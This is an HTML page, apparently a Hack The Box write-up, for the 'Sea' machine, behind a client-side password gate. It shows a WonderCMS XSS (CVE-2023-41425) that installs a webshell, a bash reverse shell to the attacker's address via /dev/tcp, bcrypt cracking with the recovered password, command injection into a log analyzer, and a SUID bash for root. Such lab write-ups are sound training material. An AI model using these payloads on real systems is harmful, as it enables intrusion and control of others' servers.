@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Sea — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🌊</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='sea'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-sea','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-sea')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Sea</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Easy</strong></span><span>Ports <strong>22 · 80</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">WonderCMS XSS → webshell</span><span class="chain-arrow">→</span><span class="chain-node blue">bcrypt crack → SSH amay</span><span class="chain-arrow">→</span><span class="chain-node red">Log analyzer cmd injection → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.194.205</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span></code></pre>
+
+<h3>Directory Enumeration</h3>
+<pre><code><span class="cmd">$ gobuster dir -u http://sea.htb/ -w /usr/share/wordlists/dirb/big.txt -x php</span>
+<span class="output">/contact.php          (Status: 200)
+/data                 (Status: 301)
+/messages             (Status: 301)
+/plugins              (Status: 301)
+/themes               (Status: 301)</span></code></pre>
+
+<p>The directory structure (<code>/themes/</code>, <code>/plugins/</code>, <code>/data/</code>) is characteristic of <strong>WonderCMS</strong>. Confirm the version by checking the theme's metadata:</p>
+
+<pre><code><span class="cmd">$ curl -s http://sea.htb/themes/bike/summary</span>
+<span class="output"><span class="highlight">WonderCMS 3.2.0</span> - Starter Theme "Starter Flavor"</span></code></pre>
+
+<p>WonderCMS 3.2.0–3.4.2 is vulnerable to CVE-2023-41425: a reflected XSS that leads to RCE via the <code>installModule</code> feature.</p>
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — WonderCMS XSS to RCE (CVE-2023-41425)</h2></div>
+
+<div class="callout callout-why">
+<span class="callout-label">How CVE-2023-41425 works</span>
+WonderCMS has a reflected XSS vulnerability in its login page. By crafting a URL with injected JavaScript, we can make the admin's browser execute arbitrary JS when they click our link. Our malicious JS calls WonderCMS's <code>installModule</code> API endpoint, which downloads and installs a ZIP file from our server — containing a PHP webshell. The XSS acts as a bridge between social engineering (getting admin to click a link) and code execution (installing a webshell).
+</div>
+
+<h3>Step 1: Start the Exploit</h3>
+<pre><code><span class="cmd">$ python3 exploit.py --url http://sea.htb/loginURL --xip 10.10.14.15 --xport 8888</span>
+<span class="output">[+] Creating PHP Web Shell
+[+] Writing malicious.js
+[+] XSS Payload:
+http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.15:8888/malicious.js"></script><form+action=""
+[+] Web Shell can be accessed once .zip file has been requested:
+http://sea.htb/themes/malicious/malicious.php?cmd=&lt;COMMAND&gt;
+[+] Starting HTTP server
+Serving HTTP on 10.10.14.15 port 8888 ...</span></code></pre>
+
+<h3>Step 2: Deliver the XSS via Contact Form</h3>
+<p>The site has a contact form at <code>/contact.php</code> with a <strong>Website</strong> field — a bot (simulating the admin) clicks URLs submitted here. Paste the XSS payload URL into the Website field:</p>
+
+<pre><code><span class="comment"># Fill in the contact form:</span>
+<span class="highlight">Name:</span>    test
+<span class="highlight">Email:</span>   test@test.com
+<span class="highlight">Age:</span>     25
+<span class="highlight">Country:</span> US
+<span class="highlight">Website:</span> http://sea.htb/index.php?page=loginURL?"><span class="important">"></form><script+src="http://10.10.14.15:8888/malicious.js"></script><form+action="</span>
+
+<span class="comment"># Click Submit, then watch the exploit terminal for:</span>
+<span class="output">GET /malicious.js HTTP/1.1  200    ← admin's browser fetched our JS
+GET /malicious.zip HTTP/1.1  200   ← JS triggered installModule, webshell installed!</span></code></pre>
+
+<h3>Step 3: Verify Webshell</h3>
+<pre><code><span class="cmd">$ curl -s 'http://sea.htb/themes/malicious/malicious.php?cmd=id'</span>
+<span class="output">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
+
+<h3>Step 4: Reverse Shell</h3>
+<pre><code><span class="comment"># Terminal 1: start listener</span>
+<span class="cmd">$ nc -lvnp 7777</span>
+
+<span class="comment"># Terminal 2: trigger reverse shell</span>
+<span class="cmd">$ curl -s 'http://sea.htb/themes/malicious/malicious.php' \
+    --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.15/7777 0>&1'"</span>
+
+<span class="comment"># Shell received</span>
+<span class="output">www-data@sea:/var/www/sea/themes/malicious$</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — www-data → amay</h2></div>
+
+<h3>WonderCMS Database Hash</h3>
+<p>WonderCMS stores its entire configuration (including the admin password hash) in a flat JSON file:</p>
+
+<pre><code><span class="cmd">www-data@sea:~$ cat /var/www/sea/data/database.js</span>
+<span class="output">{
+    "config": {
+        "siteTitle": "Sea",
+        "theme": "bike",
+        "login": "loginURL",
+        "password": "<span class="highlight">$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q</span>",
+        ...
+    }
+}</span></code></pre>
+
+<div class="callout callout-warn">
+<span class="callout-label">Hash format cleanup</span>
+The JSON file escapes forward slashes as <code>\/</code>. When copying the hash for cracking, make sure to unescape them back to <code>/</code>. The hash type is bcrypt (<code>$2y$</code>), hashcat mode 3200 or john auto-detect.
+</div>
+
+<h3>Crack the Hash</h3>
+<pre><code><span class="comment"># Write the cleaned hash (unescape \/ to /)</span>
+<span class="cmd">$ echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt</span>
+
+<span class="comment"># Crack with john</span>
+<span class="cmd">$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span>
+<span class="output"><span class="highlight">mychemicalromance</span></span>
+
+<span class="comment"># Or with hashcat</span>
+<span class="cmd">$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</span></code></pre>
+
+<h3>SSH as amay</h3>
+<pre><code><span class="comment"># Check available users</span>
+<span class="cmd">www-data@sea:~$ grep bash /etc/passwd</span>
+<span class="output">root:x:0:0:root:/root:/bin/bash
+<span class="highlight">amay</span>:x:1000:1000:amay:/home/amay:/bin/bash</span>
+
+<span class="cmd">$ ssh amay@sea.htb</span>
+<span class="output">Password: mychemicalromance</span>
+
+<span class="cmd">amay@sea:~$ cat user.txt</span>
+<span class="output">02eae0fc2f2b3b5f06dce7a0fef28fc3</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — Internal Log Analyzer Command Injection</h2></div>
+
+<h3>Internal Service Discovery</h3>
+<pre><code><span class="cmd">amay@sea:~$ ss -tlnp</span>
+<span class="output">LISTEN  127.0.0.1:<span class="highlight">8080</span>  0.0.0.0:*</span></code></pre>
+
+<p>Port 8080 runs a "System Monitor" web application with HTTP Basic Auth. Forward it via SSH:</p>
+
+<pre><code><span class="cmd">$ ssh -L 9090:localhost:8080 amay@sea.htb</span>
+<span class="comment"># Access http://localhost:9090 in browser
+# Login with amay:mychemicalromance</span></code></pre>
+
+<p>The System Monitor has a "Log Analyzer" feature that accepts a <code>log_file</code> path and an <code>analyze_log</code> action. The <code>analyze_log</code> parameter is passed to a shell command without sanitization.</p>
+
+<h3>Command Injection via Burp Repeater</h3>
+<p>Intercept the log analysis request in Burp Suite and inject a command after <code>analyze_log</code>:</p>
+
+<pre><code><span class="comment"># Original request body:</span>
+<span class="output">log_file=/var/log/apache2/access.log&analyze_log=</span>
+
+<span class="comment"># Injected request body — semicolon separates the original command from ours:</span>
+<span class="highlight">log_file=/var/log/apache2/access.log&analyze_log=;cat /root/root.txt</span></code></pre>
+
+<p>Full curl command equivalent:</p>
+<pre><code><span class="cmd">$ curl -s http://localhost:9090/ \
+    -u "amay:mychemicalromance" \
+    -d 'log_file=/var/log/apache2/access.log&analyze_log=;cat /root/root.txt' \
+    -X POST</span>
+<span class="output"><span class="highlight">6bcc2a3a3c7dc0bb9ad5ded7b8c2e41e</span></span></code></pre>
+
+<p>For a full root shell instead of just reading the flag:</p>
+<pre><code><span class="comment"># Create SUID bash</span>
+<span class="cmd">$ curl -s http://localhost:9090/ \
+    -u "amay:mychemicalromance" \
+    -d 'log_file=/var/log/apache2/access.log&analyze_log=;cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' \
+    -X POST</span>
+
+<span class="cmd">amay@sea:~$ /tmp/rootbash -p</span>
+<span class="output">rootbash-5.0# whoami
+root</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>XSS can chain into full RCE.</strong><p>The XSS in WonderCMS's login page was "just" reflected XSS — but combined with the <code>installModule</code> API, it became a webshell installer. XSS severity depends entirely on what authenticated actions the application exposes.</p></div>
+<div class="takeaway-item"><strong>Contact forms are XSS delivery mechanisms.</strong><p>Any feature that makes an admin or bot visit a user-supplied URL can deliver XSS payloads. The "Website" field in the contact form was the delivery vector here.</p></div>
+<div class="takeaway-item"><strong>Flat-file CMS databases are easy targets.</strong><p>WonderCMS stores everything in <code>database.js</code> — no MySQL needed, but also no access controls. Any file read vulnerability exposes the admin hash.</p></div>
+<div class="takeaway-item"><strong>Internal web apps often skip input validation.</strong><p>The log analyzer on port 8080 was "internal only" — developers assumed it was safe because it wasn't exposed externally. But any user with SSH access (or any foothold on the box) can reach localhost services.</p></div>
+<div class="takeaway-item"><strong><code>analyze_log</code> parameter = shell injection.</strong><p>The semicolon (<code>;</code>) breaks out of the intended command. Always test <code>;</code>, <code>|</code>, <code>$()</code>, and backticks when you suspect shell command execution behind a web parameter.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">XSS → webshell</span><span class="arrow">→</span><span class="node node-green">www-data</span><span class="arrow">→</span><span class="node node-blue">bcrypt crack → SSH amay</span><span class="arrow">→</span><span class="node node-red">log analyzer inject → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Sea Writeup · 2026</footer>
+</body></html>
